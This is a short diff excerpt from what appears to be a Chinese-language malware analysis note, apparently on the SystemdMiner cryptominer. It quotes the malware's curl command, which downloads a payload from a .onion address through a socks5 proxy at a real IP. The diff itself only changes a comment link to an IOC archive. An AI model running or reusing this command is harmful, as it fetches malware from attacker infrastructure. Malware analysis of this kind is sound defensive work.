@@ -71,7 +71,7 @@ author: 0e0w
   通过程序自带的socks5代理，下载暗网中ryukdssuskovhnwb.onion/int.x86_64文件。
   ```bash
   curl -4fsSLkA- -m200 -x socks5h://165.22.117.234:9050 ryukdssuskovhnwb.onion/int.x86_64 -o./d24e930116b812dc7ca9c410a615fe53
-  #www.0e0w.com/zip/d24e930116b812dc7ca9c410a615fe53.7z
+  #https://0e0w.com/upload/SystemdMiner-ioc.7z
   ```
   
   暂时无分析d24e930116b812dc7ca9c410a615fe53的能力与精力。后续待进行。
